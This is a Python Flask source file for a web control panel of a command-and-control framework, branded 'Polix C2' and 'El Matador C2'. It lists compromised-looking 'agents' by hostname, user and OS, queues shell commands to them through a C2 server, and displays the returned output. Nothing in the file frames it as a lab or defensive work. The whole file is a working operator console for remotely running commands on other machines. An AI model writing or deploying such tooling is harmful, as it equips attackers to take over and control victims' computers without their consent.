#!/usr/bin/env python3
"""
Polix C2 GUI - Flask Web Interface
Run this to control the C2 framework
"""

from flask import Flask, render_template_string, request, jsonify
import requests
import json
from datetime import datetime

app = Flask(__name__)

# Configuration
C2_SERVER = "http://localhost:8443"

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Polix C2 - Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            background: #0f1235;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ff41;
            box-shadow: 0 0 10px rgba(0,255,65,0.3);
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .status {
            font-size: 14px;
            color: #00ff41;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1.5fr;
            gap: 20px;
        }
        
        .panel {
            background: #0f1235;
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #00ff41;
        }
        
        .panel h2 {
            margin-bottom: 15px;
            font-size: 20px;
            border-bottom: 1px solid #00ff41;
            padding-bottom: 10px;
        }
        
        .agent-list {
            max-height: 500px;
            overflow-y: auto;
        }
        
        .agent-item {
            background: #1a1f4e;
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .agent-item:hover {
            background: #252b6e;
            transform: translateX(5px);
        }
        
        .agent-item.selected {
            background: #00ff41;
            color: #0a0e27;
            border-left: 4px solid #fff;
        }
        
        .agent-name {
            font-weight: bold;
            font-size: 16px;
        }
        
        .agent-info {
            font-size: 12px;
            margin-top: 5px;
            color: #888;
        }
        
        .command-area {
            margin-top: 20px;
        }
        
        .command-input {
            width: 100%;
            background: #0a0e27;
            color: #00ff41;
            border: 1px solid #00ff41;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .send-btn {
            background: #00ff41;
            color: #0a0e27;
            border: none;
            padding: 10px 20px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            margin-right: 10px;
        }
        
        .send-btn:hover {
            background: #00cc33;
            transform: scale(1.05);
        }
        
        .clear-btn {
            background: #ff0040;
            color: white;
            border: none;
            padding: 10px 20px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
        }
        
        .output {
            background: #0a0e27;
            border: 1px solid #00ff41;
            border-radius: 5px;
            padding: 10px;
            height: 400px;
            overflow-y: auto;
            margin-top: 15px;
            font-size: 12px;
        }
        
        .output-line {
            margin: 5px 0;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .command-sent {
            color: #ffa500;
        }
        
        .command-result {
            color: #00ff41;
        }
        
        .error {
            color: #ff0040;
        }
        
        .refresh-btn {
            background: #1a1f4e;
            color: #00ff41;
            border: 1px solid #00ff41;
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 3px;
            margin-left: 10px;
        }
        
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #0a0e27;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #00ff41;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐂 EL MATADOR C2 FRAMEWORK</h1>
            <div class="status">
                Status: <span id="status">Connected</span> | 
                Agents: <span id="agent-count">0</span> |
                Last Update: <span id="last-update">-</span>
            </div>
        </div>
        
        <div class="dashboard">
            <div class="panel">
                <h2>📡 CONNECTED AGENTS</h2>
                <button class="refresh-btn" onclick="refreshAgents()">⟳ Refresh</button>
                <div id="agent-list" class="agent-list">
                    Loading agents...
                </div>
            </div>
            
            <div class="panel">
                <h2>💻 COMMAND CONSOLE</h2>
                <div id="selected-agent">No agent selected</div>
                <div class="command-area">
                    <input type="text" id="command-input" class="command-input" 
                           placeholder="Enter command (e.g., whoami, ls, ps, ipconfig, help)">
                    <button class="send-btn" onclick="sendCommand()">⚡ EXECUTE</button>
                    <button class="clear-btn" onclick="clearOutput()">🗑️ CLEAR</button>
                </div>
                <div id="output" class="output">
                    <div class="output-line">[*] El Matador C2 Console Ready</div>
                    <div class="output-line">[*] Select an agent and type commands</div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let selectedAgent = null;
        let refreshInterval = null;
        
        // Fetch agents list
        async function refreshAgents() {
            try {
                const response = await fetch('/api/agents');
                const agents = await response.json();
                
                const agentListDiv = document.getElementById('agent-list');
                const agentCount = agents.length;
                document.getElementById('agent-count').innerText = agentCount;
                document.getElementById('last-update').innerText = new Date().toLocaleTimeString();
                
                if (agents.length === 0) {
                    agentListDiv.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">No agents connected</div>';
                    return;
                }
                
                let html = '';
                agents.forEach(agent => {
                    const selectedClass = (selectedAgent === agent.agent_id) ? 'selected' : '';
                    const lastSeen = new Date(agent.last_seen).toLocaleString();
                    html += `
                        <div class="agent-item ${selectedClass}" onclick="selectAgent('${agent.agent_id}')">
                            <div class="agent-name">${agent.agent_id}</div>
                            <div class="agent-info">
                                ${agent.hostname} | ${agent.username}<br>
                                ${agent.os}<br>
                                Last seen: ${lastSeen}
                            </div>
                        </div>
                    `;
                });
                
                agentListDiv.innerHTML = html;
            } catch (error) {
                console.error('Error fetching agents:', error);
                document.getElementById('agent-list').innerHTML = '<div class="error">Error loading agents</div>';
            }
        }
        
        // Select agent
        function selectAgent(agentId) {
            selectedAgent = agentId;
            document.getElementById('selected-agent').innerHTML = `Selected: <strong>${agentId}</strong>`;
            refreshAgents(); // Refresh to update selection highlight
            addOutputLine(`[*] Selected agent: ${agentId}`, 'command-sent');
        }
        
        // Send command
        async function sendCommand() {
            if (!selectedAgent) {
                addOutputLine('[-] Please select an agent first', 'error');
                return;
            }
            
            const commandInput = document.getElementById('command-input');
            const command = commandInput.value.trim();
            
            if (!command) {
                addOutputLine('[-] Please enter a command', 'error');
                return;
            }
            
            addOutputLine(`[>] Sending to ${selectedAgent}: ${command}`, 'command-sent');
            
            try {
                const response = await fetch('/api/send_command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        agent_id: selectedAgent,
                        command: command
                    })
                });
                
                const result = await response.json();
                addOutputLine(`[+] Command queued (ID: ${result.command_id})`, 'command-result');
                commandInput.value = '';
                
                // Fetch command history after a delay
                setTimeout(() => fetchCommandHistory(selectedAgent), 3000);
                
            } catch (error) {
                addOutputLine(`[-] Failed to send command: ${error}`, 'error');
            }
        }
        
        // Fetch command history
        async function fetchCommandHistory(agentId) {
            try {
                const response = await fetch(`/api/command_history/${agentId}`);
                const commands = await response.json();
                
                if (commands.length > 0) {
                    const latest = commands[0];
                    if (latest.status === 'completed' && latest.result) {
                        addOutputLine(`\n[←] Result for command #${latest.id}:`, 'command-result');
                        const lines = latest.result.split('\\n');
                        lines.forEach(line => {
                            if (line.trim()) {
                                addOutputLine(`  ${line}`, 'command-result');
                            }
                        });
                        addOutputLine('─' . repeat(50), 'command-result');
                    }
                }
            } catch (error) {
                // Silent fail
            }
        }
        
        // Add output line
        function addOutputLine(text, className = '') {
            const outputDiv = document.getElementById('output');
            const lineDiv = document.createElement('div');
            lineDiv.className = `output-line ${className}`;
            lineDiv.textContent = text;
            outputDiv.appendChild(lineDiv);
            lineDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
        
        // Clear output
        function clearOutput() {
            const outputDiv = document.getElementById('output');
            outputDiv.innerHTML = '<div class="output-line">[*] Console cleared</div>';
        }
        
        // Auto-refresh every 5 seconds
        refreshAgents();
        refreshInterval = setInterval(refreshAgents, 5000);
        
        // Command history for up/down keys
        let commandHistory = [];
        let historyIndex = 0;
        
        document.getElementById('command-input').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                sendCommand();
            } else if (e.key === 'ArrowUp') {
                if (historyIndex < commandHistory.length) {
                    historyIndex++;
                    this.value = commandHistory[commandHistory.length - historyIndex] || '';
                }
                e.preventDefault();
            } else if (e.key === 'ArrowDown') {
                if (historyIndex > 0) {
                    historyIndex--;
                    this.value = commandHistory[commandHistory.length - historyIndex] || '';
                } else {
                    this.value = '';
                }
                e.preventDefault();
            }
        });
        
        function saveCommandToHistory(cmd) {
            if (cmd && commandHistory[commandHistory.length - 1] !== cmd) {
                commandHistory.push(cmd);
                historyIndex = 0;
            }
        }
        
        // Override sendCommand to save history
        const originalSendCommand = sendCommand;
        sendCommand = function() {
            const cmd = document.getElementById('command-input').value;
            saveCommandToHistory(cmd);
            originalSendCommand();
        };
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/agents')
def get_agents():
    """Proxy to get agents from C2 server"""
    try:
        response = requests.get(f'{C2_SERVER}/api/admin/agents', timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify([])

@app.route('/api/send_command', methods=['POST'])
def send_command():
    """Proxy to send command to C2 server"""
    try:
        response = requests.post(f'{C2_SERVER}/api/admin/send_command', 
                                json=request.json, timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/command_history/<agent_id>')
def command_history(agent_id):
    """Proxy to get command history"""
    try:
        response = requests.get(f'{C2_SERVER}/api/admin/commands/{agent_id}', timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify([])

def main():
    print("=" * 60)
    print("  Polix C2 - Web GUI")
    print("=" * 60)
    print(f"[*] Connecting to C2 server: {C2_SERVER}")
    print(f"[*] Starting web interface on http://localhost:5000")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == '__main__':
    main()
